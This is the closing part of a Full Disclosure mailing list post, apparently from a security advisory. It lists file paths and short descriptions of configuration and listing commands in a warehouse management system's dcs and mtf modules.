+./dcs/src/cmdsrc/dcsdyncfg/configure_clientid_fields_visibility.mcmd
+     configure clientid fields visibility
+./dcs/src/cmdsrc/dcsdyncfg/configure_clsrcvtrkopr_fields_visibility.mcmd
+     configure clsrcvtrkopr fields visibility
+./dcs/src/cmdsrc/dcsdyncfg/configure_distromnt_fields.mcmd
+     configure distromnt fields
+./dcs/src/cmdsrc/dcsdyncfg/configure_part_clientid_fields_visibility.mcmd
+      configure part clientid fields visibility
+./dcs/src/cmdsrc/dcsdyncfg/configure_default_inventory_status_field.mcmd
+     configure default inventory status field
+./dcs/src/cmdsrc/dcsdyncfg/configure_export_type_for_shipment.mcmd
+     configure export type for shipment
+./dcs/src/cmdsrc/dcsdyncfg/configure_starter_pallet_fields.mcmd
+      configure starter pallet fields
+./dcs/src/cmdsrc/dcsdyncfg/configure_receive_invoice_line_fields.mcmd
+      configure receive invoice line fields
+./dcs/src/cmdsrc/dcsdyncfg/configure_trlrmgtopr_fields_enable.mcmd
+     configure trlrmgtopr fields enable
+./dcs/src/cmdsrc/dcsdyncfg/configure_dispatchtrlr_fields_enable.mcmd
+     configure dispatchtrlr fields enable
+./dcs/src/cmdsrc/dcsdyncfg/configure_supplier_consigned_fields_for_invadj.mcmd
+ configure supplier consigned fields for invadj
+./dcs/src/cmdsrc/dcsdyncfg/configure_trailer_asset_fields_enable.mcmd
+      configure trailer asset fields enable
+./dcs/src/cmdsrc/dcsdyncfg/configure_minimum_shelf_life_field.mcmd
+     configure minimum shelf life field
+./dcs/src/cmdsrc/dcsdyncfg/configure_supplier_consigned_fields_at_warehouse.mcmd
+configure supplier consigned fields at warehouse
+./dcs/src/cmdsrc/dcsdyncfg/configure_bomcatch_quantity.mcmd
+      configure bomcatch quantity
+./dcs/src/cmdsrc/dcsdyncfg/configure_trailer_asset_fields_visibility.mcmd
+      configure trailer asset fields visibility
+./mtf/src/cmdsrc/mtfint/list_rf_runnable_forms.mcmd
+      list rf runnable forms
+./mtf/src/cmdsrc/mtfint/list_rf_vendors.mcmd
+     list rf vendors
+./mtf/src/cmdsrc/mtfint/get_locale_for_warehouse.mcmd
+      get locale for warehouse
+./mtf/src/cmdsrc/mtfint/list_rf_terminals.mcmd
+     list rf terminals
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
